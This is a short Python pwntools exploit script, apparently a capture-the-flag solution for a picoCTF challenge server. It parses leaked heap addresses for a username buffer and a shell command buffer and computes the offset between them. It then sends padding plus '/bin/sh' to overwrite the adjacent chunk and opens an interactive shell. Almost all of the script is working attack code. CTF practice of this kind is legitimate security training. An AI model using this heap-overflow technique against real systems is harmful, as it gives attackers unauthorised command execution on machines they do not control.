from pwn import *

# Context setup (optional, but good practice)
context.log_level = 'info'

# Define the target
# Use remote('ip_address', port) if you are connecting to a live CTF server
# Use process('./your_binary_name') for local testing
target =  remote('amiable-citadel.picoctf.net', 51166)

# 1. Parse the leaked addresses
target.recvuntil(b"username at ")
username_leak = target.recvline().strip()
username_addr = int(username_leak, 16) # Convert hex string to integer

target.recvuntil(b"shell at ")
shell_leak = target.recvline().strip()
shell_addr = int(shell_leak, 16)

log.success(f"Username address: {hex(username_addr)}")
log.success(f"Shell address: {hex(shell_addr)}")

# 2. Calculate the exact offset dynamically
offset = shell_addr - username_addr
log.info(f"Calculated offset between chunks: {offset} bytes")

# 3. Craft the payload
# Pad with 'A's for the exact distance, then append the command we want to run.
# The null byte (\x00) ensures the string terminates correctly.
payload = b"A" * offset
payload += b"/bin/sh\x00" 

# 4. Send the payload and catch the shell
target.recvuntil(b"Enter username: ")
target.sendline(payload)

# Switch to interactive mode so you can send commands to your new shell
log.success("Payload sent. Dropping to interactive shell...")
target.interactive()
